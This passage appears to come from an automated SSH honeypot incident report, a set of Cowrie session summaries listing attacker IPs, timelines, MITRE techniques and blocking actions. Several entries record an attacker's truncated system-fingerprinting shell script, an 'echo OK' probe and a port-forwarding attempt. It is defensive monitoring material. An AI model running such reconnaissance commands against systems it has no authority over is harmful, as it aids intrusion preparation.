| `2026-07-06 13:22:08` | `cowrie.command.input` |
| `2026-07-06 13:22:08` | `cowrie.command.failed` |
| `2026-07-06 13:22:09` | `cowrie.log.closed` |
| `2026-07-06 13:22:09` | `cowrie.session.params` |
| `2026-07-06 13:22:09` | `cowrie.command.input` |
| `2026-07-06 13:22:09` | `cowrie.session.file_download` |
| `2026-07-06 13:22:09` | `cowrie.log.closed` |
| `2026-07-06 13:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.47[.]136` to AbuseIPDB if not already reported
- [ ] Block `129.121.47[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94a0d19a516a

| Field | Detail |
|---|---|
| **Source IP** | `129.121.47[.]136` |
| **First Seen** | 2026-07-06 13:22 |
| **Last Seen** | 2026-07-06 13:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:22:10` | `cowrie.session.connect` |
| `2026-07-06 13:22:10` | `cowrie.client.version` |
| `2026-07-06 13:22:10` | `cowrie.client.kex` |
| `2026-07-06 13:22:10` | `cowrie.login.success` |
| `2026-07-06 13:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.47[.]136` to AbuseIPDB if not already reported
- [ ] Block `129.121.47[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb61ff02bf5

| Field | Detail |
|---|---|
| **Source IP** | `129.121.47[.]136` |
| **First Seen** | 2026-07-06 13:22 |
| **Last Seen** | 2026-07-06 13:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:22:10` | `cowrie.session.connect` |
| `2026-07-06 13:22:10` | `cowrie.client.version` |
| `2026-07-06 13:22:11` | `cowrie.client.kex` |
| `2026-07-06 13:22:11` | `cowrie.login.success` |
| `2026-07-06 13:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.47[.]136` to AbuseIPDB if not already reported
- [ ] Block `129.121.47[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c49d5ea56fd9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:22 |
| **Last Seen** | 2026-07-06 13:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:22:59` | `cowrie.session.connect` |
| `2026-07-06 13:23:00` | `cowrie.client.version` |
| `2026-07-06 13:23:00` | `cowrie.client.kex` |
| `2026-07-06 13:23:01` | `cowrie.login.success` |
| `2026-07-06 13:23:02` | `cowrie.session.params` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.success` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:02` | `cowrie.command.input` |
| `2026-07-06 13:23:03` | `cowrie.log.closed` |
| `2026-07-06 13:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbde468dc8f0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 13:23 |
| **Last Seen** | 2026-07-06 13:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:23:29` | `cowrie.session.connect` |
| `2026-07-06 13:23:30` | `cowrie.client.version` |
| `2026-07-06 13:23:30` | `cowrie.client.kex` |
| `2026-07-06 13:23:36` | `cowrie.login.success` |
| `2026-07-06 13:23:40` | `cowrie.session.params` |
| `2026-07-06 13:23:40` | `cowrie.command.input` |
| `2026-07-06 13:23:41` | `cowrie.log.closed` |
| `2026-07-06 13:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4437da49572

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:24 |
| **Last Seen** | 2026-07-06 13:24 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:24:09` | `cowrie.session.connect` |
| `2026-07-06 13:24:13` | `cowrie.client.version` |
| `2026-07-06 13:24:13` | `cowrie.client.kex` |
| `2026-07-06 13:24:40` | `cowrie.login.success` |
| `2026-07-06 13:24:49` | `cowrie.session.params` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.success` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:49` | `cowrie.command.input` |
| `2026-07-06 13:24:53` | `cowrie.log.closed` |
| `2026-07-06 13:24:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718589626386

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:24 |
| **Last Seen** | 2026-07-06 13:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:24:21` | `cowrie.session.connect` |
| `2026-07-06 13:24:21` | `cowrie.client.version` |
| `2026-07-06 13:24:21` | `cowrie.client.kex` |
| `2026-07-06 13:24:22` | `cowrie.login.success` |
| `2026-07-06 13:24:23` | `cowrie.session.params` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.success` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:23` | `cowrie.command.input` |
| `2026-07-06 13:24:24` | `cowrie.log.closed` |
| `2026-07-06 13:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-956ce04425fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:25 |
| **Last Seen** | 2026-07-06 13:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:25:44` | `cowrie.session.connect` |
| `2026-07-06 13:25:44` | `cowrie.client.version` |
| `2026-07-06 13:25:44` | `cowrie.client.kex` |
| `2026-07-06 13:25:45` | `cowrie.login.success` |
| `2026-07-06 13:25:46` | `cowrie.session.params` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.success` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:46` | `cowrie.command.input` |
| `2026-07-06 13:25:47` | `cowrie.log.closed` |
| `2026-07-06 13:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947a68670515

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:26 |
| **Last Seen** | 2026-07-06 13:27 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:26:23` | `cowrie.session.connect` |
| `2026-07-06 13:26:27` | `cowrie.client.version` |
| `2026-07-06 13:26:27` | `cowrie.client.kex` |
| `2026-07-06 13:26:43` | `cowrie.login.success` |
| `2026-07-06 13:26:53` | `cowrie.session.params` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.success` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:53` | `cowrie.command.input` |
| `2026-07-06 13:26:58` | `cowrie.log.closed` |
| `2026-07-06 13:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251f56332efb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:27 |
| **Last Seen** | 2026-07-06 13:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:27:07` | `cowrie.session.connect` |
| `2026-07-06 13:27:07` | `cowrie.client.version` |
| `2026-07-06 13:27:07` | `cowrie.client.kex` |
| `2026-07-06 13:27:09` | `cowrie.login.success` |
| `2026-07-06 13:27:10` | `cowrie.session.params` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.success` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.command.input` |
| `2026-07-06 13:27:10` | `cowrie.log.closed` |
| `2026-07-06 13:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df6a984e43ee

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 13:27 |
| **Last Seen** | 2026-07-06 13:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:27:13` | `cowrie.session.connect` |
| `2026-07-06 13:27:13` | `cowrie.client.version` |
| `2026-07-06 13:27:13` | `cowrie.client.kex` |
| `2026-07-06 13:27:13` | `cowrie.login.success` |
| `2026-07-06 13:27:13` | `cowrie.direct-tcpip.request` |
| `2026-07-06 13:27:14` | `cowrie.direct-tcpip.data` |
| `2026-07-06 13:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ad3ee3b149

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:28 |
| **Last Seen** | 2026-07-06 13:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:28:31` | `cowrie.session.connect` |
| `2026-07-06 13:28:31` | `cowrie.client.version` |
| `2026-07-06 13:28:31` | `cowrie.client.kex` |
| `2026-07-06 13:28:33` | `cowrie.login.success` |
| `2026-07-06 13:28:34` | `cowrie.session.params` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.success` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:34` | `cowrie.command.input` |
| `2026-07-06 13:28:35` | `cowrie.log.closed` |
| `2026-07-06 13:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04916ffc51d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:28 |
| **Last Seen** | 2026-07-06 13:29 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:28:34` | `cowrie.session.connect` |
| `2026-07-06 13:28:38` | `cowrie.client.version` |
| `2026-07-06 13:28:38` | `cowrie.client.kex` |
| `2026-07-06 13:28:58` | `cowrie.login.success` |
| `2026-07-06 13:29:07` | `cowrie.session.params` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.success` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:07` | `cowrie.command.input` |
| `2026-07-06 13:29:13` | `cowrie.log.closed` |
| `2026-07-06 13:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269839c035fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:29 |
| **Last Seen** | 2026-07-06 13:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:29:54` | `cowrie.session.connect` |
| `2026-07-06 13:29:54` | `cowrie.client.version` |
| `2026-07-06 13:29:54` | `cowrie.client.kex` |
| `2026-07-06 13:29:56` | `cowrie.login.success` |
| `2026-07-06 13:29:57` | `cowrie.session.params` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.success` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:57` | `cowrie.command.input` |
| `2026-07-06 13:29:58` | `cowrie.log.closed` |
| `2026-07-06 13:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b566aa91f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:30 |
| **Last Seen** | 2026-07-06 13:31 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:30:42` | `cowrie.session.connect` |
| `2026-07-06 13:30:46` | `cowrie.client.version` |
| `2026-07-06 13:30:46` | `cowrie.client.kex` |
| `2026-07-06 13:31:06` | `cowrie.login.success` |
| `2026-07-06 13:31:16` | `cowrie.session.params` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.success` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:16` | `cowrie.command.input` |
| `2026-07-06 13:31:21` | `cowrie.log.closed` |
| `2026-07-06 13:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c569fa9f6ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:31 |
| **Last Seen** | 2026-07-06 13:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
